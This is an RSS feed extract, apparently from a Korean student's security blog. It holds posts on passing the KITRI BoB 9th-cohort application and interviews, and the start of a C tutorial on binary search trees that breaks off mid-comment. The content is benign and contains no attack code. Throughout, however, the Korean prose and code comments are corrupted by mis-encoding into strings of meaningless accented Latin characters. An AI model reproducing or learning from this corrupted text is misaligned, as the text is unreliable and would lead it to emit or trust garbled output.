ì‹¶ì–´ ì§€ì›í–ˆë‹¤ëŠ” ë‚´ìš©ì„ ë‹´ë‹´íˆ ì´ì•¼ê¸°í•˜ëŠ” ê²ƒì´ ì¢‹ê² ìŠµë‹ˆë‹¤.</li><li>ì €ëŠ” ë‚´ìš©ì„ ì™¸ìš°ê³  ë°œí‘œí•˜ëŠ” í¸ì´ ê°•ì•½ì„ ì£¼ê±°ë‚˜ ê°ì •ì„ ì¡°ì ˆí•  ë•Œ ë„ì›€ì´ ë˜ì—ˆìŠµë‹ˆë‹¤.</li></ul></li><li>ì œê°€ ì…ì¥í•œ ë©´ì ‘ì‹¤ì€ ë©˜í† ë‹˜ ë‘ ë¶„ì— ì§€ì›ì ì„¸ ëª…ì´ ì…ì¥í–ˆìŠµë‹ˆë‹¤.</li><li>ì €ëŠ” ëŒ€ë¶€ë¶„ â€œ~ë¥¼ ê³µë¶€í–ˆë‹¤ê³  í–ˆëŠ”ë° ~ë¥¼ ì•„ëŠëƒâ€, &quot;~ì— ëŒ€í•´ ì„¤ëª…í•´ë³´ì•„ë¼&quot;ì™€ ê°™ì€ ì§ˆë¬¸ì„ ë°›ì•˜ìŠµë‹ˆë‹¤.<ul><li>IE 1-dayë¥¼ ê³µë¶€í–ˆë‹¤ëŠ” ë‚´ìš©ì—ì„œ &quot;IEì˜ MemGC ë³´í˜¸ ê¸°ë²•ì— ëŒ€í•´ í•™ìŠµí–ˆëŠëƒ&quot;ëŠ” ì§ˆë¬¸ì„ ë°›ì•˜ëŠ”ë°, ì†”ì§í•˜ê²Œ ì²˜ìŒ ë“¤ì–´ë³¸ë‹¤ê³  ë§ì”€ë“œë ¸ë”ë‹ˆ ë‹¤ìŒ ì§ˆë¬¸ìœ¼ë¡œ ë„˜ì–´ê°€ì…¨ìŠµë‹ˆë‹¤.</li></ul></li><li>ì œê°€ ë°›ì€ ì§ˆë¬¸ì˜ ê²½ìš° ëŒ€ë¶€ë¶„ ìê¸°ì†Œê°œì„œì™€ 3ë¶„ ìê¸°ì†Œê°œì—ì„œ ê²¹ì¹˜ëŠ” ì†Œì†Œì¬ì— ëŒ€í•œ ë‚´ìš©ì„ ë¬¼ì–´ë³´ì…¨ìŠµë‹ˆë‹¤.</li><li>ë”°ë¼ì„œ ì„œë¥˜ë‚˜ ìê¸°ì†Œê°œì— ê°•ì¡°í•œ ë‚´ìš©ì— ëŒ€í•´ì„œëŠ” ì˜ˆìƒ ì§ˆë¬¸ì„ ìŠ¤ìŠ¤ë¡œ ë§Œë“¤ì–´ ë³´ì‹œê³  ëŒ€ë¹„í•˜ëŠ” ê²ƒì´ ì¢‹ì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤.</li></ul><br>í•©ê²© ì´í›„ ë§ˆìŒì„ ì¶”ìŠ¤ë¦¬ê³  ì •ë¦¬í•´ ë³´ì•˜ëŠ”ë°, ë§ì€ ë¶„ë“¤ê»˜ ë„ì›€ì´ ë˜ì—ˆìœ¼ë©´ ì¢‹ê² ìŠµë‹ˆë‹¤. ê¸€ ë‚´ìš©ê³¼ ê´€ë ¨ëœ ì§ˆë¬¸ì€ ëŒ“ê¸€ì´ë‚˜ ì—°ë½ ì£¼ì‹œë©´ ìƒì„¸íˆ ë‹µë³€ë“œë¦¬ê² ìŠµë‹ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ BoB ì§€ì›ì˜ ì „ ê³¼ì •ì—ì„œ ì „í­ì ìœ¼ë¡œ ë„ì›€ì„ ë°›ì•˜ë˜ ê³ ë ¤ëŒ€í•™êµ ì´í¬ì¡° êµìˆ˜ë‹˜ê³¼ ê¹€ì˜í›ˆ ì„ ë°°, ê·¸ë¦¬ê³  ì‘ì›í•´ì£¼ì‹  ëª¨ë“  ë¶„ë“¤ê»˜ ê°ì‚¬ë“œë¦½ë‹ˆë‹¤.<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Thoughts/">Thoughts</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/06/18/kitri-bob-9-2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>KITRI BoB 9ê¸° ìµœì¢…í•©ê²© / ì„œë¥˜, ë©´ì ‘ í›„ê¸° (1)</title>
      <link>https://juhyun167.github.io/2022/06/09/kitri-bob-9-1/</link>
      <guid>https://juhyun167.github.io/2022/06/09/kitri-bob-9-1/</guid>
      <pubDate>Thu, 09 Jun 2022 17:47:23 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/images/kitri-bob-9-1/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ê°ì‚¬í•˜ê²Œë„ ì ì§€ ì•Šì€ ë¶„ë“¤ì˜ í° ë„ì›€ìœ¼ë¡œ KITRI BoB 9ê¸°ì— ìµœì¢… í•©ê²©í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;br&gt;
ì´ë²ˆ ê¸€ì—ì„œëŠ” ê·¸ê°„ ì¤€ë¹„ ê³¼ì •ê³¼ ì„œë¥˜,</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/kitri-bob-9-1/1.png" alt="1.png"></p><p>ê°ì‚¬í•˜ê²Œë„ ì ì§€ ì•Šì€ ë¶„ë“¤ì˜ í° ë„ì›€ìœ¼ë¡œ KITRI BoB 9ê¸°ì— ìµœì¢… í•©ê²©í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.<br>ì´ë²ˆ ê¸€ì—ì„œëŠ” ê·¸ê°„ ì¤€ë¹„ ê³¼ì •ê³¼ ì„œë¥˜, ë©´ì ‘ ê²½í—˜ì„ ê³µìœ í•˜ì—¬ ë‹¤ë¥¸ ë¶„ë“¤ê»˜ ë§ì€ ë„ì›€ì´ ë˜ì—ˆìœ¼ë©´ í•©ë‹ˆë‹¤.</p><h2 id="%EC%A4%80%EB%B9%84-%EA%B3%BC%EC%A0%95" tabindex="-1">ì¤€ë¹„ ê³¼ì •</h2><ul><li>ê³µë¶€ëŠ” ê³ ë“±í•™ìƒ ë•Œ ì›¹ í•´í‚¹ì„ ì ê¹, ëŒ€í•™ ì§„í•™ í›„ ì‹œìŠ¤í…œ í•´í‚¹ì„ ì¼ë…„ ë°˜ ì •ë„ ê³µë¶€í–ˆìŠµë‹ˆë‹¤.</li><li>ê³µë¶€í•œ ë‚´ìš©ì„ ì£¼ë¡œ ë™ì•„ë¦¬ ìŠ¤í„°ë””ì—ì„œ ê³µìœ í•˜ë©´ì„œ, ë™ì•„ë¦¬ í™œë™ ê²½í—˜ ë¶€ë¶„ì—ì„œ í•  ì´ì•¼ê¸°ê°€ ë§ì•„ì¡ŒìŠµë‹ˆë‹¤.</li><li>ì£¼ë¡œ ì›Œê²Œì„ ë¬¸ì œë¥¼ í’€ë©´ì„œ ê³µë¶€í•œ ë‚´ìš©ì„ ë³µìŠµí–ˆìŠµë‹ˆë‹¤.<ul><li><a href="http://pwnable.kr/">pwnable.kr</a>ì„ ì ˆë°˜, <a href="https://pwnable.xyz/">pwnable.xyz</a>ëŠ” 7ë¬¸ì œ ì •ë„ ì œì™¸í•˜ê³  ì „ë¶€ í’€ì—ˆìŠµë‹ˆë‹¤.</li></ul></li></ul><h2 id="%EC%84%9C%EB%A5%98-%EC%A0%84%ED%98%95" tabindex="-1">ì„œë¥˜ ì „í˜•</h2><ul><li>ìê¸°ì†Œê°œì„œëŠ” 7ê°œ ë¬¸í•­ì— ê° 1,000ìì”©ìœ¼ë¡œ ì‘ë…„ê³¼ ë™ì¼í–ˆìŠµë‹ˆë‹¤.</li><li>ìê¸°ì†Œê°œ<ul><li>í•´í‚¹ì„ ì ‘í•˜ê³  ê³µë¶€í•˜ê²Œ ëœ ê³„ê¸°, ëŒ€í•™êµ 1~2í•™ë…„ ë•Œ ê³µë¶€í•˜ê³  í™œë™í•œ ì´ì•¼ê¸°ë¥¼ ì£¼ë¡œ ì ì—ˆìŠµë‹ˆë‹¤.</li><li>ì €ëŠ” ê³µë¶€í•  ë•Œ ë¬¸ì„œë‚˜ ë°±ì„œ, ì „ê³µì„œì ì„ ì°¸ê³ í•˜ëŠ” ê²ƒì„ ì¤‘ìš”í•˜ê²Œ ìƒê°í•˜ëŠ”ë°, ê·¸ ë¶€ë¶„ì„ ê°•ì¡°í•˜ì˜€ìŠµë‹ˆë‹¤.</li><li>ë³´ì•ˆê³¼ ê´€ë ¨ëœ ì–´ë–¤ ì£¼ì œë¥¼ ì™œ, ì–´ë–»ê²Œ ê³µë¶€í•´ì„œ ì–´ë–¤ ì„±ê³¼ë¥¼ ëƒˆëŠ”ì§€ê°€ ì¶©ë¶„íˆ í¬í•¨ë˜ë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li><li>ë³¸ì¸ì´ ì´ë£¬ ê°€ì¥ í° ì„±ê³¼ ë° ì‚¬ë¡€<ul><li>ì „ê³µìˆ˜ì—…ì—ì„œ í•™êµ í¬í„¸ì‹œìŠ¤í…œì„ ëª¨ì˜í•´í‚¹í•  ê¸°íšŒê°€ ìˆì—ˆëŠ”ë°, ê·¸ ë•Œ ê²½í—˜ê³¼ ëŠë‚€ ì ì„ ì ì—ˆìŠµë‹ˆë‹¤.</li><li>ì´ í•­ëª©ì€ ê°œì¸ì°¨ê°€ í¬ê² ì§€ë§Œ, ì–´ë–¤ ê³„ê¸°ë¡œ ì–´ë–¤ ê¸°ìˆ ì„ ì‚¬ìš©í–ˆê³ , ì–´ë–¤ ê²ƒì„ ë°°ì› ë‹¤ëŠ” ë‚´ìš©ì´ë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li><li>ì§€ì› ë™ê¸°<ul><li>ì €ëŠ” í¬ê²Œ ì§€ì›í•œ ì´ìœ ì™€, BoBì—ì„œ ë‚˜ ìì‹ ì„ ìœ„í•´, ì‚¬íšŒë¥¼ ìœ„í•´ í•˜ê³  ì‹¶ì€ ì¼ë¡œ ë‚˜ëˆ„ì—ˆìŠµë‹ˆë‹¤.</li><li>ì§€ì› ë™ê¸°ì—ì„œ ì—´ì •ê³¼ ëª©í‘œê°€ ë“œëŸ¬ë‚˜ê³ , ê·¸ ëª©í‘œë¥¼ ì‹¤í˜„ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì‹¤ë ¥ì´ë‚˜ ì ì¬ë ¥ì˜ ê·¼ê±°ê°€ ë‹¤ë¥¸ í•­ëª©ê³¼ ê°™ì´ ì¶©ë¶„íˆ ë“œëŸ¬ë‚˜ë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li><li>í•©ê²© í›„ í¬ë¶€<ul><li>CTFì— ë‚˜ê°€ê³  ì‹¶ë‹¤, í˜„ì‹¤ ì‚¬ë¡€ë¥¼ ì´ì•¼ê¸°í•˜ë©° ì´ëŸ° í”„ë¡œì íŠ¸ë¥¼ í•´ë³´ê³  ì‹¶ë‹¤ëŠ” ë‚´ìš©ì„ ì£¼ë¡œ ì ì—ˆìŠµë‹ˆë‹¤.</li><li>ì´ í•­ëª©ì€ ì •ë§ BoBì—ì„œ í•˜ê³  ì‹¶ì€ ì¼ì„ ì¡°ë¦¬ìˆê²Œ ì ìœ¼ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤.</li></ul></li><li>ê´€ì‹¬ ë¶„ì•¼<ul><li>ì €ëŠ” ì‹œìŠ¤í…œ í•´í‚¹ ë¶„ì•¼ì—ì„œ ê³µë¶€í•˜ë©° ê¸°ë¡ì„ ë‚¨ê¸°ê³ , ë™ì•„ë¦¬ì›ë“¤ê³¼ ìŠ¤í„°ë””í•œ ì´ì•¼ê¸°ë¥¼ ì ì—ˆìŠµë‹ˆë‹¤.</li><li>ì§€ì›í•œ íŠ¸ë™ê³¼ ê´€ë ¨í•˜ì—¬ ê²½í—˜ì´ ì–´ëŠ ì •ë„ ìˆëŠ” ë¶„ë“¤ì€ ìƒì„¸í•œ ê²½í—˜ì„ ê´€ì‹¬ë¶„ì•¼ í•­ëª©ì— ë…¹ì—¬ë‚´ë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li><li>ê²½í—˜ì´ ë§ì§€ ì•Šì€ ë¶„ë“¤ë„ ì´ëŸ° ë¶„ì•¼ì— í¥ë¯¸ê°€ ìˆìœ¼ë©°, ê·¸ë˜ì„œ ì´ëŸ° ë‚´ìš©ì„ ì§€ê¸ˆ ê³µë¶€í•˜ê³  ìˆë‹¤ëŠ” ë‚´ìš©ì´ ìˆìœ¼ë©´ ì¶©ë¶„í•©ë‹ˆë‹¤.</li></ul></li><li>BoB í•™ìŠµê³„íš<ul><li>BoB í™ˆí˜ì´ì§€ì—ì„œëŠ” ê³µí†µ êµìœ¡ ê¸°ê°„ì— ëª¨ë“  íŠ¸ë™ì˜ ê¸°ì´ˆ ìˆ˜ì—…ì„, íŠ¸ë™ë³„ êµìœ¡ ë‹¨ê³„ì—ì„œ ì‹¬í™”ëœ ë‚´ìš©ì„ êµìœ¡í•œë‹¤ê³  ë°íˆê³  ìˆìŠµë‹ˆë‹¤.</li><li>ë”°ë¼ì„œ ê³µí†µ êµìœ¡ ë‹¨ê³„ì—ì„œ ê¸°ì´ˆì ì¸ ì†Œì–‘ì„ í‚¤ìš°ê³ , íŠ¸ë™ë³„ êµìœ¡ ë‹¨ê³„ì—ì„œ ë³¸ì¸ì´ ê´€ì‹¬ìˆëŠ” ë¶„ì•¼ì˜ ì´ë–¤ ì„¸ë¶€ì ì¸ ì£¼ì œë¥¼ ê³µë¶€í•˜ê² ë‹¤ëŠ” ë‚´ìš©ì´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li><li>ì§„ë¡œ ê³„íš<ul><li>ì§„ë¡œ ê³„íšì€ í•™ìŠµ ê³„íšê³¼ ë‹¬ë¦¬ BoB ì´ìˆ˜ ì´í›„ì— ì´ˆì ì„ ë§ì¶˜ í•­ëª©ì…ë‹ˆë‹¤.</li><li>ê·¸ëŸ¬ë¯€ë¡œ ë© ì¸í„´, ì·¨ì—…, ì—°êµ¬ ë“±ì„ í†µí•´ ê´€ì‹¬ìˆëŠ” ë¶„ì•¼ì˜ ìµœì‹  ì£¼ì œë¥¼ ê³µë¶€í•˜ê³  ì „ë¬¸ê°€ê°€ ë˜ê² ë‹¤ëŠ” í¬ë¶€ë¥¼ ë°íˆë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.<br><br></li></ul></li></ul><p>ì„œë¥˜ ì „í˜• ê´€ë ¨ëœ ë‚´ìš©ë§Œì„ ì ì—ˆëŠ”ë°ë„ ê¸€ì´ ë²Œì¨ ê¸¸ì–´ì¡Œë„¤ìš”. í•„ê¸°ì™€ ë©´ì ‘ ì´ì•¼ê¸°ëŠ” <a href="/2022/06/18/kitri-bob-9-2/">ë‹¤ìŒ ê¸€</a>ì—ì„œ ê³„ì†í•˜ê² ìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ì„œë¥˜ ì „í˜•ê³¼ ê´€ë ¨í•´ ì§ˆë¬¸ì´ ìˆìœ¼ì‹œë©´, ëŒ“ê¸€ì´ë‚˜ ì´ë©”ì¼ í†µí•´ì„œ ìµœëŒ€í•œ ë‹µë³€ ë“œë¦¬ê² ìŠµë‹ˆë‹¤!</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Thoughts/">Thoughts</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/06/09/kitri-bob-9-1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬</title>
      <link>https://juhyun167.github.io/2022/06/08/binary-search-tree/</link>
      <guid>https://juhyun167.github.io/2022/06/08/binary-search-tree/</guid>
      <pubDate>Wed, 08 Jun 2022 22:10:34 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;p&gt;ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì •ì˜ì™€ ì„±ì§ˆì„ ì‚´í´ë³´ê³  êµ¬í˜„í•´ ë³´ê² ìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì •ì˜ì™€ ì„±ì§ˆì„ ì‚´í´ë³´ê³  êµ¬í˜„í•´ ë³´ê² ìŠµë‹ˆë‹¤.</p><h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC%EB%9E%80" tabindex="-1">ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ë€</h2><h3 id="%EC%A0%95%EC%9D%98%EC%99%80-%EC%84%B1%EC%A7%88" tabindex="-1">ì •ì˜ì™€ ì„±ì§ˆ</h3><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬(binary search tree)ëŠ” ì´ì§„ íŠ¸ë¦¬ë©´ì„œ, ë‹¤ìŒê³¼ ê°™ì€ ì¬ê·€ì ì¸ ì„±ì§ˆì„ ê°€ì§„ íŠ¸ë¦¬ì…ë‹ˆë‹¤.</p><blockquote><p>ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì™¼ìª½ íŠ¸ë¦¬ì— ìˆëŠ” ë…¸ë“œë“¤ì€ ë” ì‘ì€ í‚¤(key)ë¥¼ ê°€ì§„ë‹¤. ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì— ìˆëŠ” ë…¸ë“œë“¤ì€ ë” í° í‚¤ë¥¼ ê°€ì§„ë‹¤.</p></blockquote><p>ì„±ì§ˆì—ì„œ ì•Œ ìˆ˜ ìˆë“¯, ì´ì§„ íƒìƒ‰  íŠ¸ë¦¬ëŠ” í‚¤-ê°’(key-value)ì˜ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” ìë£Œêµ¬ì¡°ì…ë‹ˆë‹¤. ì´ ê¸€ì—ì„œëŠ” í¸ì˜ìƒ í‚¤ì™€ ê°’ì€ ëª¨ë‘ ì •ìˆ˜ì´ë©°, ë‘ ê°’ì´ ê°™ì•„ê³  ê°€ì •í•˜ê² ìŠµë‹ˆë‹¤. ì•„ë˜ ê·¸ë¦¼ì˜ ë‘ íŠ¸ë¦¬ëŠ” ëª¨ë‘ ìœ„ì˜ ì„±ì§ˆì„ ë§Œì¡±í•˜ëŠ” ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì…ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/1.png" alt="1.png"></p><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ëŠ” ì„±ì§ˆ ìƒ íƒìƒ‰, ì‚½ì…, ì‚­ì œ ë“± ì—°ì‚°ì˜ ì‹œê°„ ë³µì¡ë„ê°€ íŠ¸ë¦¬ì˜ ë†’ì´ì— ë¹„ë¡€í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ê°™ì€ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” íŠ¸ë¦¬ë¼ë„ í˜•íƒœì— ë”°ë¼ ë³µì¡ë„ì˜ ì°¨ì´ê°€ ìƒê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¼ì—ì„œ ì™¼ìª½ì˜ ê²½ìš° <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>ì˜ ì‹œê°„ ë³µì¡ë„ë¥¼ ê°–ì§€ë§Œ, ì˜¤ë¥¸ìª½ê³¼ ê°™ì´ ë¹„íš¨ìœ¨ì ì¸ ê²½ìš° ìµœì•…ì—ëŠ” <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>ì˜ ë³µì¡ë„ë¥¼ ê°–ê²Œ ë©ë‹ˆë‹¤.</p><h3 id="%EA%B5%AC%EC%A1%B0%EC%B2%B4%EC%99%80-%ED%95%A8%EC%88%98-%EC%84%A0%EC%96%B8" tabindex="-1">êµ¬ì¡°ì²´ì™€ í•¨ìˆ˜ ì„ ì–¸</h3><p>ìë£Œêµ¬ì¡° êµ¬í˜„ì€ ëª¨ë‘ Cì–¸ì–´ë¡œ í•˜ê² ìŠµë‹ˆë‹¤. íŠ¸ë¦¬ì˜ ë…¸ë“œì— í•´ë‹¹í•˜ëŠ” <code>Node</code> êµ¬ì¡°ì²´ëŠ” í‚¤ì™€ ê°’ì„ ë‚˜íƒ€ë‚´ëŠ” <code>key</code> ì™€ <code>value</code> , ê°ê° ì™¼ìª½ ìì‹, ì˜¤ë¥¸ìª½ ìì‹, ë¶€ëª¨ ë…¸ë“œë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° <code>left</code> , <code>right</code> , <code>parent</code> ë¥¼ ë©¤ë²„ë¡œ ê°€ì§‘ë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ë¥¼ ë‚˜íƒ€ë‚´ëŠ” <code>BST</code> êµ¬ì¡°ì²´ëŠ” ë£¨íŠ¸ ë…¸ë“œë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° <code>root</code> ë¥¼ ë©¤ë²„ë¡œ ê°€ì§‘ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line"><span class="type">int</span> key, value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>, *<span class="title">right</span>, *<span class="title">parent</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTree</span> &#123;</span></span><br><span class="line">Node *root;</span><br><span class="line">&#125; BST;</span><br></pre></td></tr></table></figure><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì—°ì‚°ì„ êµ¬í˜„í•˜ê¸° ìœ„í•œ í•¨ìˆ˜ë“¤ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ëª¨ë“  ë…¸ë“œë¥¼ í‚¤ ìˆœìœ¼ë¡œ ì¶œë ¥í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ì£¼ì–´ì§„ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ì•„ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *<span class="title function_">search</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// í‚¤ ìˆœìœ¼ë¡œ ì •ë ¬í–ˆì„ ë•Œ í•˜ë‚˜ ì‘ì€ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// í‚¤ ìˆœìœ¼ë¡œ ì •ë ¬í–ˆì„ ë•Œ í•˜ë‚˜ í° í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ì‚½ì…í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ì£¼ì–´ì§„ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì‚­ì œí•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br></pre></td></tr></table></figure><p>ìœ„ì˜ í•¨ìˆ˜ë“¤ì„ êµ¬í˜„í•˜ê¸° ìœ„í•´ ë‚´ë¶€ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ë‚´ì¥ í•¨ìˆ˜ë“¤ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. í•¨ìˆ˜ ì´ë¦„ ì•ì— ì–¸ë”ìŠ¤ì½”ì–´(underscore) ë‘ ê°œê°€ ë¶™ì–´ ìˆìœ¼ë©´ ë‚´ì¥ í•¨ìˆ˜ë¡œ êµ¬ë¶„í•˜ê² ìŠµë‹ˆë‹¤. ì´ í•¨ìˆ˜ë“¤ì˜ í•„ìš”ì„±ê³¼ ì“°ì„ì— ëŒ€í•´ì„œëŠ” ë°‘ì—ì„œ í•˜ë‚˜ì”© ì‚´í´ë³¼ ì˜ˆì •ì…ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì¤‘ìœ„ ìˆœíšŒí•˜ë©° í‚¤ì™€ ê°’ì„ ì¶œë ¥í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ í•˜ìœ„ íŠ¸ë¦¬ì—ì„œ ì£¼ì–´ì§„ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ì•„ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì™¼ìª½ íŠ¸ë¦¬ì—ì„œ ê°€ì¥ ì‘ì€ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_min(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ ê°€ì¥ í° í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_max(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// í‚¤ ìˆœìœ¼ë¡œ ì •ë ¬í–ˆì„ ë•Œ ë…¸ë“œì˜ 